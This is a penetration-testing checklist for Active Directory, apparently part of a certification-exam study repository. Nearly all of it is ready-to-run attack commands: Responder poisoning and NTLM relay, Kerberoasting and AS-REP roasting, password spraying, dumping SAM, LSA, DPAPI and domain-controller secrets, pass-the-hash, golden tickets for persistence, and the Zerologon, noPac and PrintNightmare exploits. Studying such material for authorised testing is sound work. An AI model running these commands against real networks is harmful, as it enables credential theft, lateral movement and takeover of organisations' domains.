# 03 — Active Directory

Trigger: ports 88 (Kerberos), 389/636 (LDAP), 445 (SMB), or 464 (kpasswd) on any host.
Reference: [AD Enumeration](../1-information-gathering/06-active-directory-enumeration.md) · [AD Initial Access](../3-exploitation/05-ad-initial-access.md) · [AD Overview](../5-lateral-movement/01-active-directory-overview.md) · [Kerberos Attacks](../5-lateral-movement/03-kerberos-attacks.md).

## Zero-cred enum (do all of these first)

- [ ] **Start Responder in a dedicated terminal the moment you land internal** — this is the highest-ROI passive attack in AD, run it while everything else happens:
  - Analyze-only first (no poisoning, just listen): `sudo responder -I tun0 -A`.
  - Full poisoning: `sudo responder -I tun0 -wF` (`-w` WPAD, `-F` force NTLM auth).
  - Captured hashes land at `/usr/share/responder/logs/*NTLMv2*.txt` — crack with `hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`.
  - If SMB signing is off on any host, pivot to relaying instead of cracking: turn off Responder's SMB/HTTP servers (`/etc/responder/Responder.conf` → `SMB=Off`, `HTTP=Off`) and run `impacket-ntlmrelayx -tf smb_signing_off.txt -smb2support -socks` in parallel.
  - `sudo responder -I tun0 -P -v` (`-P` proxy auth capture) also grabs WPAD proxy creds if the client uses PAC files.
- [ ] Confirm DC + domain name: `nxc smb <dc-ip>`.
- [ ] Add to `/etc/hosts`: `<dc-ip> dc01.domain.local domain.local`.
- [ ] SMB null session: `nxc smb <dc-ip> -u '' -p '' --shares --users --groups --pass-pol`.
- [ ] Guest session: `nxc smb <dc-ip> -u guest -p ''`.
- [ ] LDAP anonymous bind: `ldapsearch -x -H ldap://<dc-ip> -b "DC=domain,DC=local"`.
- [ ] User enum via RID cycling: `nxc smb <dc-ip> -u guest -p '' --rid-brute 10000`.
- [ ] Kerberos user enum (works without creds): `kerbrute userenum -d <domain> --dc <dc-ip> users.txt`.
- [ ] AS-REP roast anyone unregistered for pre-auth: `impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc-ip> -no-pass -format hashcat`.

## When you have one credential

- [ ] **Spray it everywhere**: `nxc smb hosts.txt -u <user> -p <pass> --continue-on-success`.
- [ ] SMB shares readable? `nxc smb <ip> -u <user> -p <pass> --shares`, then `smbclient //<ip>/<share> -U <user>`.
- [ ] Dump SPNs (Kerberoast): `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc-ip> -request -outputfile spns.hash`.
- [ ] AS-REP roast with creds: `impacket-GetNPUsers <domain>/<user>:<pass> -request -dc-ip <dc-ip>`.
- [ ] Domain enum with bloodhound: `bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc-ip> -c All`.
  - Import into BloodHound → run "Find Shortest Paths to Domain Admins" from your owned user.
- [ ] LDAP dump: `ldapdomaindump -u <domain>\\<user> -p <pass> <dc-ip>`.
- [ ] Password stored in `Description` field: `nxc ldap <dc-ip> -u <user> -p <pass> -M user-desc`.

## Common share loot (do this immediately after mounting anything)

- [ ] `SYSVOL\<domain>\Policies\` — old GPP `cpassword` (crack with `gpp-decrypt`).
- [ ] Any `.ps1`, `.bat`, `.vbs`, `.config` — grep for `password`, `pwd`, `secret`, `key`.
- [ ] Any `.kdbx` file (KeePass) → download → `keepass2john` → hashcat mode 13400.
- [ ] `unattend.xml`, `sysprep.xml`, `autounattend.xml` — plaintext admin creds.
- [ ] User profile shares — `.rdp` files with saved creds, browser profiles.

## Attack list (tick as you rule each out)

- [ ] **AS-REP roast** — any user with `DONT_REQ_PREAUTH`. Hashcat mode 18200.
- [ ] **Kerberoast** — any user with a `servicePrincipalName`. Hashcat mode 13100.
- [ ] **Machine account quota** (MAQ ≥ 1) → RBCD attack. `impacket-addcomputer`.
- [ ] **ACL abuse** — check BloodHound edges outbound from your user: `GenericAll`, `WriteDACL`, `WriteOwner`, `ForceChangePassword`. Use `bloodyAD`. See [ACL Abuse](../5-lateral-movement/04-acl-abuse-bloodyad.md).
- [ ] **Unconstrained delegation** — hosts with `TRUSTED_FOR_DELEGATION`. Coerce DC → capture TGT.
- [ ] **Constrained delegation** — S4U2Self + S4U2Proxy dance.
- [ ] **Resource-based constrained delegation (RBCD)** — need `WriteProperty` on `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- [ ] **PetitPotam / PrinterBug / DFSCoerce** — force auth from a host. Chain with unconstrained/ntlmrelay.
- [ ] **NTLM relay** — `ntlmrelayx -tf targets.txt -smb2support` while `responder -I tun0` runs.
- [ ] **ADCS** — ESC1 through ESC8. `certipy find -u <user>@<domain> -p <pass> -dc-ip <dc-ip> -vulnerable`.
- [ ] **noPac (CVE-2021-42278/42287)** — `impacket-noPac` if MAQ > 0 and DC unpatched.
- [ ] **Zerologon (CVE-2020-1472)** — only if the exam brief allows. Nukes the DC's password.
- [ ] **PrintNightmare (CVE-2021-34527)** — local privesc on any Windows host with spooler on.
- [ ] **SMB signing off?** → NTLM relay is on the table. `nxc smb hosts.txt --gen-relay-list relay.txt`.

## Lateral movement (post first-machine access)

- [ ] Dump SAM + LSA + DPAPI: `nxc smb <ip> -u <user> -p <pass> --sam --lsa --dpapi`.
- [ ] `secretsdump` on the box: `impacket-secretsdump <domain>/<user>:<pass>@<ip>`.
- [ ] Pass-the-hash across the estate: `nxc smb hosts.txt -u <user> -H <NT-hash> --continue-on-success`.
- [ ] Pass-the-ticket if you have a `.ccache`: `export KRB5CCNAME=./ticket.ccache; nxc smb <ip> -k --use-kcache`.
- [ ] Silver ticket (service TGS) or golden ticket (KRBTGT hash) — see [Kerberos Attacks](../5-lateral-movement/03-kerberos-attacks.md).

## Post-DA

- [ ] `secretsdump` on the DC: `impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc-ip>`.
- [ ] Grab `krbtgt` hash → golden ticket capability for long-term persistence (**use surgically — a golden ticket in the logs is a burn signal**).
- [ ] Dump every user hash → hashcat with rockyou + rules → additional creds for lateral reach.

## Reminders that catch people out

- Time skew kills Kerberos. `sudo ntpdate <dc-ip>` or `sudo rdate -n <dc-ip>` before any Kerberos attack.
- Domain FQDN must be in `/etc/hosts` — Kerberos hates raw IPs.
- `nxc` vs `crackmapexec` — `nxc` is the maintained fork. Same syntax.
